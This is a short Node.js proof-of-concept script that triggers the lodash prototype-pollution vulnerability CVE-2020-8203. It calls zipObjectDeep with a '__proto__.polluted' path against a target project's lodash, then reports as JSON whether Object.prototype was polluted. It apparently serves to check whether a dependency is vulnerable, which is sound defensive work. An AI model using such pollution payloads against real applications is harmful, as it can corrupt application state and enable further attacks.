const path = require('path');

const targetDir = process.argv[2];
if (!targetDir) {
    console.error("Usage: node poc_lodash.js <target_dir>");
    process.exit(1);
}

const _ = require(path.join(process.cwd(), targetDir, 'node_modules', 'lodash'));

try {
    // Run the exploit
    _.zipObjectDeep(['__proto__.polluted'], [true]);
} catch (e) {
    // ignore
}

// Check if a completely unrelated object has been polluted
const testObj = {};
const isPolluted = testObj.polluted === true;

const result = {
    cve_id: "CVE-2020-8203",
    target_dir: targetDir,
    exploit_triggered: isPolluted,
    detail: `Object.prototype.polluted === ${isPolluted}`
};

console.log(JSON.stringify(result));
